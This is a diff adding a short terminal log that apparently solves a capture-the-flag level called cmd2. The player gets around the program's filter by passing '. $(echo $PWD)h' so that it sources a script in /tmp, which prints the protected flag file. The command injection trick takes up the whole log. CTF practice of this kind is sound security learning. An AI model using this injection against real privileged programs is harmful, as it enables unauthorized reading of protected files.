@@ -1,0 +1,18 @@
+cmd2@ubuntu:/tmp/.1337$ /home/cmd2/cmd2 '. $(echo $PWD)a'                                                                                                 
+. $(echo $PWD)a
+sh: 1: .: Can't open /tmp/.1337a
+cmd2@ubuntu:/tmp/.1337$ cd ..
+cmd2@ubuntu:/tmp$ touch .blah
+cmd2@ubuntu:/tmp$ mkdir .bla
+cmd2@ubuntu:/tmp$ cd .bla
+cmd2@ubuntu:/tmp/.bla$ vi ../.blah
+cmd2@ubuntu:/tmp/.bla$ /home/cmd2/cmd2 '. $(echo $PWD)h'   
+
+cmd2@ubuntu:/tmp/.bla$ /home/cmd2/cmd2 '. $(echo $PWD)h'
+. $(echo $PWD)h
+FuN_w1th_5h3ll_v4riabl3s_haha
+cmd2@ubuntu:/tmp/.bla$ ls
+cmd2@ubuntu:/tmp/.bla$ cat ../.blah
+#!/bin/bash
+
+/bin/cat /home/cmd2/flag
